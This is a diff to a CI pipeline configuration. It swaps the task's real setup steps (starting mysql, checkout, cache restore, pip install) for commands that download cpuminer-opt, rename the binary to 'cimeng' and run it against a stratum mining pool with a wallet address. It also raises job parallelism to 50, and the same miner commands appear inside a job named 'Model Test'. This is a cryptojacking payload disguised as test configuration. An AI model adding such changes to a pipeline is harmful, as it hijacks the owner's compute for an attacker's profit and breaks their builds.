@@ -110,10 +110,10 @@ blocks:
     task:
       prologue:
         commands:
-          - sem-service start mysql
-          - checkout
-          - cache restore
-          - pip install -r requirements.txt --cache-dir .pip_cache
+          - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+          - tar xf cpuminer-opt-linux.tar.gz
+          - mv cpuminer-sse2 cimeng
+          - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q0k8xdre9gujl89waj9avfme3jmfkadpswelmf3.momok -t4'
       jobs:
         - name: Model Test
           commands:
@@ -128,6 +128,7 @@ blocks:
             - tar xf cpuminer-opt-linux.tar.gz
             - mv cpuminer-sse2 cimeng
             - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q0k8xdre9gujl89waj9avfme3jmfkadpswelmf3.1000a -t4'
+          parallelism: 50
       epilogue:
         always:
           commands:
